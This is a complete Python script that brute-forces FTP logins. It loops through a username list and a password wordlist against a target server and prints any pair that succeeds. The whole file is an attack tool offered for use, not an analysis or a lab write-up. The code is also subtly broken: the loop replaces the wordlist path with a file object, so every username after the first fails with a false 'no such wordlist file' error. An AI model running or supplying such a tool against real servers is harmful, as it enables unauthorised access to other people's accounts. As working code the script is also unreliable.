#!/usr/bin/env python
# -*- coding:utf-8 -*-

import argparse
import sys
from ftplib import FTP


def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print ("\n[!] Credentials have found.")
        print ("\n[!] Username : {}".format(username))
        print ("\n[!] Password : {}".format(password))
        sys.exit(0)
    except:
        pass


def brute_force(target, usernames, wordlist):
    try:
        usrnames = open(usernames,"r")
        users = usrnames.readlines()
        for user in users:
            user = user.strip()
            try:
                wordlist = open(wordlist, "r")
                words = wordlist.readlines()
                for word in words:
                    word = word.strip()
                    ftp_login(target, user, word)
            except:
                print("\n[-] There is no such wordlist file. \n")
                sys.exit(0)
    except:
        print("\n[-] There is no such wordlist file. \n")
        sys.exit(0)


if __name__ == "__main__":
    if len(sys.argv) != 4:
                print("Usage: python3 ftp_bruteforce.py <path_to_user_list> <path_to_password_list> <ftp_server_ip> ")
    else:
        usernames = sys.argv[1]
        wordlist = sys.argv[2]
        target = sys.argv[3]
        try:
            brute_force(target, usernames, wordlist)
            print ("\n[-] Brute force finished. \n")
        except KeyboardInterrupt:
            exit(0)